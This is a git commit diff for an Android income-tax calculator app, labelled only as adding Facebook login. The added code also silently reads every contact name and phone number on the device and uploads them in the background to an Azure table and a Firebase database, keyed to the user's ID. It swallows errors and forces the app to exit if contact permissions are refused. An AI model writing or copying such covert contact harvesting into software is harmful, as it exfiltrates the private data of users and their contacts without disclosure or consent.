17dcebf86e8ae99873e5d812ab605193c79766b1
geniusninedev <developer@geniusnine.com>
2017-03-23 15:47:19 +0530

    Facebook login Added

--- app/src/main/java/com/nineinfosys/android/incometax/IncomeTaxMain.java
+++ app/src/main/java/com/nineinfosys/android/incometax/IncomeTaxMain.java
@@ -2,21 +2,32 @@ package com.nineinfosys.android.incometax;
 
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.content.res.Configuration;
+import android.database.Cursor;
 import android.graphics.Color;
 import android.graphics.Typeface;
 import android.net.Uri;
+import android.os.AsyncTask;
+import android.os.Build;
 import android.os.Bundle;
+import android.provider.ContactsContract;
+import android.support.annotation.NonNull;
 import android.support.design.widget.NavigationView;
+
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.FragmentManager;
 import android.support.v4.app.FragmentTransaction;
+import android.support.v4.content.ContextCompat;
 import android.support.v4.widget.DrawerLayout;
 import android.support.v7.app.ActionBarDrawerToggle;
 import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
 import android.text.SpannableString;
+import android.util.Log;
 import android.view.KeyEvent;
+import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
 import android.widget.ArrayAdapter;
@@ -27,6 +38,7 @@ import android.widget.SeekBar;
 import android.widget.Spinner;
 import android.widget.TextView;
 
+import com.facebook.login.LoginManager;
 import com.github.mikephil.charting.animation.Easing;
 import com.github.mikephil.charting.charts.PieChart;
 import com.github.mikephil.charting.components.Legend;
@@ -35,16 +47,42 @@ import com.github.mikephil.charting.data.PieDataSet;
 import com.github.mikephil.charting.data.PieEntry;
 import com.github.mikephil.charting.formatter.PercentFormatter;
 import com.github.mikephil.charting.utils.ColorTemplate;
+import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
+import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
+import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
+import com.nineinfosys.android.incometax.DashBord.GetApp;
+import com.nineinfosys.android.incometax.Login.Contacts;
+import com.nineinfosys.android.incometax.Login.LoginActivity;
+import com.squareup.okhttp.OkHttpClient;
 
+import java.net.MalformedURLException;
 import java.text.DecimalFormat;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.concurrent.TimeUnit;
+
+import static android.Manifest.permission.READ_CONTACTS;
+import static android.Manifest.permission.WRITE_CONTACTS;
 
 /**
  * Created by Dev on 01-03-2017.
  */
 
 public class IncomeTaxMain extends AppCompatActivity {
+
+    ///Azure Database connection for contact uploading
+    private MobileServiceClient mobileServiceClientContactUploading;
+    private MobileServiceTable<Contacts> mobileServiceTableContacts;
+    private ArrayList<Contacts> azureContactArrayList;
+    private static final int PERMISSION_REQUEST_CODE = 200;
+    //Firebase variables... for authentication and contact uploading to firebase
+    private FirebaseAuth firebaseAuth;
+    private FirebaseAuth.AuthStateListener firebaseAuthListner;
+    private DatabaseReference databaseReferenceUserContacts;
+
     DrawerLayout mDrawerLayout;
     NavigationView mNavigationView;
     FragmentManager mFragmentManager;
@@ -73,6 +111,10 @@ public class IncomeTaxMain extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        //firbase auth
+        firebaseAuth=FirebaseAuth.getInstance();
+
         Configuration config = getResources().getConfiguration();
 
         genderspinner = (Spinner) findViewById(R.id.genderspinnerid);
@@ -128,9 +170,9 @@ public class IncomeTaxMain extends AppCompatActivity {
 
                 if (menuItem.getItemId() == R.id.GetApps) {
 
-                    /*Intent intent=new Intent(MainActivityDrawer.this,RequestApp.class);
+                    Intent intent=new Intent(IncomeTaxMain.this,GetApp.class);
                     startActivity(intent);
-*/
+
 
                 }
 
@@ -162,6 +204,7 @@ public class IncomeTaxMain extends AppCompatActivity {
         ActionBarDrawerToggle mDrawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout, toolbar, R.string.app_name, R.string.app_name);
         mDrawerLayout.setDrawerListener(mDrawerToggle);
         mDrawerToggle.syncState();
+        authenticate();
 
         buttonCalculte.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -188,6 +231,252 @@ public class IncomeTaxMain extends AppCompatActivity {
             }
         });
     }
+
+
+
+
+    ///Uploading contacts to azure
+    private void uploadContactsToAzure(){
+
+
+        initializeAzureTable();
+        fetchContacts();
+        uploadContact();
+
+
+    }
+    private void initializeAzureTable() {
+        try {
+            mobileServiceClientContactUploading = new MobileServiceClient(
+                    getString(R.string.web_address),
+                    this);
+            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
+                @Override
+                public OkHttpClient createOkHttpClient() {
+                    OkHttpClient client = new OkHttpClient();
+                    client.setReadTimeout(20, TimeUnit.SECONDS);
+                    client.setWriteTimeout(20, TimeUnit.SECONDS);
+                    return client;
+                }
+            });
+            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);
+
+
+        } catch (MalformedURLException e) {
+
+        } catch (Exception e) {
+
+        }
+    }
+    private void fetchContacts(){
+        try {
+            azureContactArrayList = new ArrayList<Contacts>();
+
+            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);
+
+            while(phone.moveToNext()){
+                Contacts contact = new Contacts();
+                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
+                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());
+
+                azureContactArrayList.add(contact);
+
+
+
+
+            }
+            phone.close();
+        }catch (Exception e){
+
+        }
+
+
+    }
+    private void uploadContact() {
+        for (Contacts c : azureContactArrayList) {
+
+            try {
+                asyncUploader(c);
+                //mobileServiceTable.insert(c);
+            }
+            catch (Exception e){
+                Log.e("uploadContact : ", e.toString());
+            }
+        }
+    }
+    private void asyncUploader(Contacts contact){
+        final Contacts item = contact;
+        //Log.e(" ", item.getContactname());
+
+        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
+            @Override
+            protected Void doInBackground(Void... params) {
+                try {
+                    mobileServiceTableContacts.insert(item);
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            try {
+
+                            } catch (Exception e) {
+                            }
+
+
+                        }
+                    });
+                } catch (final Exception e) {
+                }
+                return null;
+            }
+        };
+        task.execute();
+    }
+
+
+    ///Authentication with firebase
+    private void authenticate(){
+        firebaseAuth = FirebaseAuth.getInstance();
+        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
+            @Override
+            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
+                if(firebaseAuth.getCurrentUser()==null){
+                    Log.e("ForumMainActivity:", "User was null so directed to Login activity");
+                    Intent loginIntent = new Intent(IncomeTaxMain.this, LoginActivity.class);
+                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                    startActivity(loginIntent);
+                    finish();
+                }
+                else {
+                    if (!checkPermission()) {
+                        requestPermission();
+                    } else {
+                        //Toast.makeText(MainActivityDrawer.this,"Permission already granted.",Toast.LENGTH_LONG).show();
+                        syncContactsWithFirebase();
+                        uploadContactsToAzure();
+
+                    }
+
+                }
+
+            }
+        };
+
+    }
+
+    @Override
+    protected void onStart() {
+        super.onStart();
+        Log.e("ForumMainActivity:", "Starting auth listener");
+        firebaseAuth.addAuthStateListener(firebaseAuthListner);
+    }
+
+
+
+    protected void syncContactsWithFirebase(){
+
+        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
+            @Override
+            protected Void doInBackground(Void... params) {
+                try {
+                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");
+
+                    String user_id = firebaseAuth.getCurrentUser().getUid();
+                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);
+
+
+                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+
+                    while (phone.moveToNext()) {
+                        String name;
+                        String number;
+
+                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+
+                        try {
+                            current_user_db.child(number).setValue(name);
+
+                        } catch (Exception e) {
+
+                        }
+
+
+
+                    }
+
+
+
+                    runOnUiThread(new Runnable() {
+
+                        @Override
+                        public void run() {
+
+
+                        }
+                    });
+                } catch (Exception exception) {
+
+                }
+                return null;
+            }
+        };
+
+        task.execute();
+    }
+
+    @Override
+    public boolean onCreateOptionsMenu(Menu menu) {
+        // Inflate the menu; this adds items to the action bar if it is present.
+        getMenuInflater().inflate(R.menu.main, menu);
+        return true;
+    }
+
+    @Override
+    public boolean onOptionsItemSelected(MenuItem item) {
+        // Handle action bar item clicks here. The action bar will
+        // automatically handle clicks on the Home/Up button, so long
+        // as you specify a parent activity in AndroidManifest.xml.
+        int id = item.getItemId();
+
+        //noinspection SimplifiableIfStatement
+        if (id == R.id.action_logout) {
+         closeapp();
+        }
+
+        return super.onOptionsItemSelected(item);
+    }
+
+
+    public  void closeapp(){
+        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
+        alertDialogBuilder.setMessage("Are you sure you want to close App?");
+        alertDialogBuilder.setPositiveButton("Yes",
+                new DialogInterface.OnClickListener() {
+                    @Override
+                    public void onClick(DialogInterface arg0, int arg1) {
+
+                        FirebaseAuth.getInstance().signOut();
+                        LoginManager.getInstance().logOut();
+                    }
+                });
+
+        alertDialogBuilder.setNegativeButton("No",
+                new DialogInterface.OnClickListener() {
+                    @Override
+                    public void onClick(DialogInterface arg0, int arg1) {
+
+                    }
+                });
+
+        //Showing the alert dialog
+        AlertDialog alertDialog = alertDialogBuilder.create();
+        alertDialog.setCanceledOnTouchOutside(false);
+        alertDialog.show();
+    }
+
+
+
     @Override
     public boolean onKeyDown(int keyCode, KeyEvent event) {
         switch (keyCode) {
@@ -342,6 +631,92 @@ public class IncomeTaxMain extends AppCompatActivity {
         super.onSaveInstanceState(outState);
     }
 
+
+    private boolean checkPermission() {
+        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
+        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);
+
+        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private void requestPermission() {
+
+        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);
+
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
+        switch (requestCode) {
+            case PERMISSION_REQUEST_CODE:
+                if (grantResults.length > 0) {
+
+                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
+                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;
+
+                    if (locationAccepted && cameraAccepted) {
+                    }
+                    else {
+
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
+                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(IncomeTaxMain.this);
+                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
+                                alertDialogBuilder.setPositiveButton("yes",
+                                        new DialogInterface.OnClickListener() {
+                                            @Override
+                                            public void onClick(DialogInterface arg0, int arg1) {
+
+                                                Log.e("ALERT BOX ", "Requesting Permissions");
+
+                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS},
+                                                            PERMISSION_REQUEST_CODE);
+                                                }
+                                            }
+                                        });
+
+                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
+                                    @Override
+                                    public void onClick(DialogInterface dialog, int which) {
+                                        Log.e("ALERT BOX ", "Permissions not granted");
+                                        android.os.Process.killProcess(android.os.Process.myPid());
+                                        System.exit(1);
+
+                                    }
+                                });
+
+                                AlertDialog alertDialog = alertDialogBuilder.create();
+                                alertDialog.setCanceledOnTouchOutside(false);
+                                alertDialog.show();
+                                return;
+                            }
+                            else{
+                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(IncomeTaxMain.this);
+                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
+                                alertDialogBuilder.setPositiveButton("Ok",
+                                        new DialogInterface.OnClickListener() {
+                                            @Override
+                                            public void onClick(DialogInterface arg0, int arg1) {
+                                                android.os.Process.killProcess(android.os.Process.myPid());
+                                                System.exit(1);
+                                            }
+                                        });
+
+                                AlertDialog alertDialog = alertDialogBuilder.create();
+                                alertDialog.setCanceledOnTouchOutside(false);
+                                alertDialog.show();
+                                return;
+
+                            }
+                        }
+
+                    }
+                }
+
+                break;
+        }
+    }
 }
 
 
